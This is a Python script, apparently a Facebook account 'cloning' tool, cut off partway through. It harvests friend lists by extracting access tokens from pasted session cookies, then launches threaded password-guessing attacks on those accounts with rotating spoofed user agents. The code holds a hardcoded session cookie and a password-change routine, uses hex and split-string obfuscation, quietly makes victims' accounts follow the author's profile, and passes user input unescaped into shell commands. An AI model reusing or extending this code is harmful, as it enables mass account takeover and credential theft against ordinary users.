
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
ghb=g1+g2+g3+g4+g5+g6+g7+g8
gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
cx=('.g');cxx=('fig');xl=('/')
  
import os,base64
os.system('xdg-open https://chat.whatsapp.com/C0lp3A1FvVXCMoPXAHZut5/?ref=share/')
u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
rqts=r1+r2+r3+r4+r5+r6+r7+r8
y1=('-');y2=('y');y3=(' > ')
ys=y1+y2+y3
print('\n\033[1;32m install missing modules...\n It will take some seconds...')
os.system(f'pip {ustl} {rqts} {ys}/dev/null')
os.system(f'pip install {rqts}{y3}/dev/null')
import requests 
from bs4 import BeautifulSoup

def changePass(old_pw, new_pw, cookie):
	cookies = {"cookie":cookie}
	with requests.Session() as session:
		session.headers.update(
			{
				"host":"m.facebook.com",
				"user-agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
			}
		)
		ref = BeautifulSoup(session.get("https://m.facebook.com/settings/security/password", cookies=cookies).text, "html.parser")
		form = ref.find("form", {"action":True, "id":"m-settings-form", "method":"post"})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"name":True, "value":True})}
		data.update(
			
		)
		response = requests.post("https://mbasic.facebook.com"+str(form.get("action")), data=data, cookies=cookies).text
		print(response)
	
	cookie = "c_user=100089369767953; xs=33:IqL2Zp0MdP6JBA:2:1675527856:-1:10565; fr=0VhsvPMfV7PxmlvZc.AWW8LK3X3g-ou4PtUdTZ25PMH_E.Bj3oav..AAA.0.0.Bj3oav.AWVd9RyIrt4; datr=r4beYxBgd-ukAQb_9AM4I25L; dpr=2; locale=en_US; wd=950x1835; m_page_voice=100089369767953"
	changePass(old_pw, new_pw, cookie)
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python MXS.py')
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass
myid=uuid.uuid4().hex[:5].upper()

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/ahmad77412/DATA-FILE/main/UAGNT').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
pkgz=('packages')
ap1=('a')
ap2=('pi')
ap3=('.p')
api=ap1+ap2+ap3
md1=('mo')
md2=('de')
md3=('ls')
md4=('.p')
mudl=md1+md2+md3+md4
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ua = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; Android 7.0'
    b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
    c='Hisense F102) '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uaku2=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    ugen.append(uaku2)
    
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
######apny kolo
import requests
rs = requests.get
ua = []

del ua
"""
NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]
"""

ua=[]

user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])

header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
try:
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	#new
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randBuildvsskj():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for x in range(10000):
    aa='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def clear():
	os.system('clear')

	 #new userugrnt u can use this-----#
	#-----------------------[DATE CHECKER]-----------------------#
def Jawnx(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :hking = ' 2009'
        elif uid[:9] in ['100000000']       :hking = '~> 2009'
        elif uid[:8] in ['10000000']        :hking = '~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:hking = '~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:hking = ' 2010'
        elif uid[:6] in ['100001']          :hking = '~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :hking = '~> 2011/2012'
        elif uid[:6] in ['100004']          :hking = '~> 2012/2013'
        elif uid[:6] in ['100005','100006'] :hking = '~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :hking = '~> 2014/2015'
        elif uid[:6] in ['100009']          :hking = '~> 2015'
        elif uid[:5] in ['10001']           :hking = '~> 2015/2016'
        elif uid[:5] in ['10002']           :hking = '~> 2016/2017'
        elif uid[:5] in ['10003']           :hking = '~> 2018/2019'
        elif uid[:5] in ['10004']           :hking = '~> 2019/2020'
        elif uid[:5] in ['10005']           :hking = '~> 2020'
        elif uid[:5] in ['10006','10007','']:hking = '~> 2021'
        elif uid[:5] in ['10008']           :hking = '~> 2022'
        else:hking=''
    elif len(uid) in [9,10]:
        hking = '~> 2008/2009'
    elif len(uid)==8:
        hking = '~> 2007/2008'
    elif len(uid)==7:
        hking = '~> 2006/2007'
    else:hking=''
    return hking
    #---------------------[APPLICATION CHECKER]---------------------#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
    else:
        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
        print(54*'-')
    else:
        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(57*'-')

logo=("""\033[1;32m
 ___      ___  ___  ___   ________  
|"  \    /"  ||"  \/"  | /"       ) 
 \   \  //   | \   \  / (:   \___/  
 /\\  \/.    |  \\  \/   \___  \    
|: \.        |  /\.  \    __/  \\   
|.  \    /:  | /  \   \  /" \   :)  
|___|\__/|___||___/\___|(_______/ 
--------------------------------------------------
\033[1;97m AUTHOR  : JANI x 906 :/
\033[1;97m GitHub : Maliksohaill :/
\033[1;97m Version:\033[1;92m 0.4 \033[1;97m:/
\033[1;97m Status : Free :/
\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
--------------------------------------------------
 \33[37;41m\t DEAR USERS NEED A BACHI  \33[0;m
\033[1;37m[-]UPDATE DATE: 02/05/23
\033[1;37m[-]NOTE: USE AIRPLANE MODE FOR SPEED OK IDZ:
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;91m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;91m'



 

def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text






loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
try:os.mkdir('data')
except:pass

def public():
	usrr=[]
	try:
		tok = open('data/token','r').read()
		cok = open('data/coki','r').read()
		tokenku.append(tok)
	except IOError:
		print('\033[1;31mYour cookies han expired...');time.sleep(1)
		c_login()
	create()
	time.sleep(1)
	clear()
	try:
		jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;91m '))
	except ValueError:
		exit(' Put only digits not latters ')
	if jum<1 or jum>5000:
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\033[1;32m Put link no.{yz+0}: ')
		usrr.append(kl)
	
	
	linex()
	print(' [1] STARTCRACKING ')
	linex()
	mthd = input(' Choose method: ')
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	linex()
	print('\033[1;32m Dumping friend list...\033[1;91m')
	linex()
	for userr in usrr:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit(f' No internet connection')
	try:
		plist = []
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		linex()
		print('\033[1;32m exp: first last,firtslast,first123')
		linex()
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(id))
			
			linex()
			for user in id:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(ffb,ids,names,passlist)
				else:
					crack_submit.submit(mmm,ids,names,passlist)
		print('\033[1;32m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python MXS.py')
	except requests.exceptions.ConnectionError:
		exit(f' No internet connection')
	except (KeyError,IOError):
		print(f' No friends for {userr}')
		time.sleep(3)
		public()
		
def create_file_login():
    ids = []
    xyz = requests.Session()
    os.system('clear')
    print(logo)
    try:
        cookies = {'cookie':open('fb_cookies.txt','r').read()}
        access_token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
        load = json.loads(check_cookies)
        iid = load['id']
        name = load['name']
    except KeyError:
        print('\n Cookies has expired, login another cookies.')
        time.sleep(1)
        os.system('rm -rf .fb_cookies.txt .access_token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    os.system('clear')
    print(logo)
    print(' [1] Create auto file (fast)')
    print(' [2] Create manual file')
    print(50*'-')
    foopt = input(' Choose option: ')
    if foopt =='1':
        auto_file(cookies,access_token)
    else:
        manual_file(cookies,access_token)
def auto_file(cookies,access_token):
    global total
    os.system('clear & rm -rf .txt .temp.txt')
    print(logo)
    print(' File auto creation mode ...')
    print(50*'-')
    print('\033[1;35m Put range between 1 to 20\033[1;97m\n')
    try:
        fl = int(input(' How many ids you want to add? '))
    except:
        fl = 1
    for xd in range(fl):
        idt = input(f' Put id no.{xd+1}: ')
        try:
            fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
            xyz = requests.Session()
            r = xyz.get(fd_url,cookies=cookies).text
            q = json.loads(r)
            for iid in q['friends']['data']:
                uid = iid['id']
                open('.txt','a').write(uid+'\n')
        except KeyError:
            print(' No friends from: '+idt)
        except requests.exceptions.ConnectionError:
            print(' No internet connection ....')
    print('\n\033[1;35m Example: 100086.100087,100088 etc\033[0;97m')
    try:
        sl = int(input('\n How many links do you want to grab? '))
    except:
        sl = 1
    for el in range(sl):
        sid = input(f' Put {el+1} link: ')
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
    print('\n \033[1;35m /sdcard/MXS.txt \033[0;97m\n')
    sf = input(' Put path to save file: ')
    file = open('.temp.txt','r').read().splitlines()
    print('')
    print(' Total ids: '+str(len(file)))
    print(' Grabbing process has started')
    print(50*'-')
    with ThreadPool(max_workers=20) as yaari:
        for exid in file:
            yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
    print(50*'-')
    print(' Total ids: '+str(len(total)))
    print('\n')
    input(' Press enter to back ')
    os.system('python MXS.py')
def iamBadBoy(exid,cookies,access_token,sf):
    try:
        global total,loop
        fd_url = 'https://b-graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
        xyz = requests.Session()
        r = xyz.get(fd_url,cookies=cookies).text
        q = json.loads(r)
        for yaad in q['friends']['data']:
            iid = yaad['id']
            name = yaad['name']
            total.append(iid)
            open(sf,'a').write(iid+'|'+name+'\n')
        loop+=1
        sys.stdout.write('\r %s | Total ids: %s\r'%(loop,len(total)));sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    except KeyError:
        pass
def manual_file(cookies,access_token):
    ids=[]
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many ids do you want to extract? '))
    except:
        limit = 1
    print('\n \033[1;32mExample: /sdcard/MXS.txt \033[0;97m\n')
    sf = input(' Save file as: ')
    print(50*'-')
    for xd in range(limit):
        idt = input(f' Put id no {xd+1}: ')
        try:
            xyz=requests.Session()
            friend_list = xyz.get('https://b-graph.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token,cookies=cookies).text
            lists = json.loads(friend_list)
            for i in lists['friends']['data']:
                iid = i['id']
                name = i['name']
                ids.append(iid)
                open(sf,'a').write(iid+'|'+name+'\n')
        except KeyError:
            print(' No friends found ...\n')
        except requests.exceptions.ConnectionError:
            print(' No internet connection ...\n')
        except KeyboardInterrupt:
            print('Skipping ...\n')
    print(50*'-')
    print(' Total ids grabbed: '+str(len(ids)))
    print(' Ids file saved in: '+sf)
    input(' \nPress enter to back ')
    os.system('python MXS.py')
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    print('\n\033[1;32m Put limit between 1 to 10 \033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;32m Example: /sdcard/MXS.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    print('')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    os.system('python MXS.py')
def remove_dub():
    os.system('clear')
    print(logo)
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print(' \n\033[1;32mExample: /sdcard/filename.txt\n\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        os.system('python MXS.py')
    except FileNotFoundError:
        print(' File not found.')
def login():
    os.system('clear')
    print(logo)
    print('\n\033[1;32m If you donot know how to get cookies, watch video on YouTube \033[0;97m')
    cookies = input(' Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 13; LE2125 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python MXS.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
def menu(): 
	os.system('clear')
	print(logo)
	print(' [1] File cloning\n [2] Create file\n [3] Public cloning\n [4] Random cloning\n [5] Gmail cloning\n [6] Separate ids\n [7] remove dublicate lines from file\n [8] login another cookie\n [9] contact with owner\n [0] Exit menu')
	linex()
	xd=input(' Choose an option: ')
	if xd in ['1','01']:
		clear()
####@FILE@#####
		linex()
		print ('Example: /sdcard/New.txt') 
		print('\033[1;32m----------------------------------------------')
		file = input('[?]Enter File \033[1;91m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(' File location not found ')
			time.sleep(1)
			menu()
		clear()
				
		linex()
		print(' [1] METHUD UPDATE:')
		linex()
		mthd=input(' Choose: ')
		linex()
		plist = []
		try:
			ps_limit = int(input('[?] INPUT PASSWORD LIMIT: '))
			print ('Example: firstlast first123 last786')
		except:
			ps_limit =1
		linex()
				
		linex()
		for i in range(ps_limit):
			plist.append(input(f'Password {i+1}: '))
		linex()
		print(' Do you went show cp account? (y/n): ')
		linex()
		cx=input(' Choose: ')
		if cx in ['y','Y','yes','Yes','1']:
			pcp.append('y')
		else:
			pcp.append('n')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(mmm,ids,names,passlist)
				else:
					crack_submit.submit(api,ids,names,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python MXS.py')
	elif xd in ['2','02']:
		create_file_login()
	elif xd in ['3','03']:
		public()
	elif xd in ['4','04']:
		clear()
		print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
		linex()
		x=input(' Choose: ')
		if x in ['1','01']:
			pak()
		elif x in ['2','02']:
			bd()
		elif x in ['3','03']:
			gmail()
		else:
			menu()
			
	elif xd in ['5','05']:
	   gmail()
	elif xd in ['6','06']:
	    sids()
	elif xd in ['7','07']:
		remove_dub()
	elif xd in ['8','08']:
		os.system('rm -rf fb_cookies.txt')
	elif xd in ['9','09']:
		os.system(f'xdg-open https://wa.me/+923077681556');menu()
			
	elif xd in ['0','00']:
		exit(' KHUDA HAFIZ ')
	else:
		exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;31m Code example: 0306,0315,0335,0345')
